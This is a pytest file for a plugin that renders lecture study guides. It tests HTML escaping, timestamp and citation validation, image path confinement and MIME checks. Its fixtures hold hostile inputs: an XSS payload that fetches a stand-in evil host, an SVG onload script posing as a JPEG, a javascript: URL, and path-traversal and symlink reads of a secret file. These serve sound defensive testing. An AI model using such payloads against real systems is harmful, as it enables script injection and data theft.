"""Safety and provenance checks for portable learning artifacts."""
import copy
import importlib.util
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
SPEC = importlib.util.spec_from_file_location("vmf_render", ROOT / "plugins/video-moment-finder/tools/render.py")
renderer = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(renderer)


@pytest.fixture
def guide():
    return {"format_version": 1, "title": "Vector lesson", "lecture": {"title": "Original fixture", "video_id": None},
            "coverage": {"kind": "synthetic", "start_s": 0, "end_s": 60, "gaps": []},
            "sources": [{"id": "s-one", "kind": "synthetic", "start_s": 0, "end_s": 10, "summary": "Original example"}],
            "sections": [{"id": "idea", "title": "Dot products", "origin": "lecture", "paragraphs": ["Multiply and add."], "citations": ["s-one"]}],
            "questions": [], "takeaways": []}


def test_source_markup_and_template_tokens_are_not_executed(guide, tmp_path):
    hostile = '</script><img src=x onerror="fetch(\"https://evil.invalid\")"> {{SOURCES}}'
    guide["sections"][0]["paragraphs"] = [hostile]
    output = renderer.render(guide, tmp_path)
    assert '<img src=x' not in output
    assert '&lt;/script&gt;&lt;img' in output
    assert '{{SOURCES}}' in output  # no second template expansion
    assert output.count('<script>') == 1  # trusted interaction code only


@pytest.mark.parametrize("value", [float('nan'), float('inf'), -1, True, "12"])
def test_bad_source_timestamps_fail_closed(guide, value):
    guide["sources"][0]["start_s"] = value
    with pytest.raises(ValueError):
        renderer.validate(guide)


def test_lecture_claim_cannot_lose_or_invent_its_citation(guide):
    for citations in ([], ["s-missing"]):
        item = copy.deepcopy(guide)
        item["sections"][0]["citations"] = citations
        with pytest.raises(ValueError):
            renderer.validate(item)


def test_image_paths_cannot_read_secrets_outside_evidence_directory(tmp_path):
    secret = tmp_path / 'secret.txt'
    secret.write_text('PRIVATE')
    root = tmp_path / 'evidence'
    root.mkdir()
    with pytest.raises(ValueError, match='within'):
        renderer.frame_image({'image_path': '../secret.txt'}, root)
    link = root / 'frame.jpg'
    link.symlink_to(secret)
    with pytest.raises(ValueError, match='within'):
        renderer.frame_image({'image_path': 'frame.jpg'}, root)


def test_missing_image_has_readable_fallback(tmp_path):
    output = renderer.frame_image({'image_path': 'missing.jpg'}, tmp_path)
    assert 'image is unavailable' in output
    assert '<img' not in output


def test_image_mime_is_checked_not_trusted_from_filename(tmp_path):
    (tmp_path / 'frame.jpg').write_text('<svg onload="alert(1)"></svg>')
    with pytest.raises(ValueError, match='PNG or JPEG'):
        renderer.frame_image({'image_path': 'frame.jpg'}, tmp_path)


def test_timestamp_link_uses_verified_uuid_not_arbitrary_url(guide):
    guide['lecture']['video_id'] = '0d1e5052-8a1c-4b11-9c8e-a39c6680ba49'
    source = {'start_s': 223, 'end_s': 234}
    output = renderer.source_link(guide, source)
    assert '/video/0d1e5052-8a1c-4b11-9c8e-a39c6680ba49?t=223' in output
    assert '03:43–03:54' in output
    guide['lecture']['video_id'] = 'javascript:alert(1)'
    with pytest.raises(ValueError):
        renderer.validate(guide)
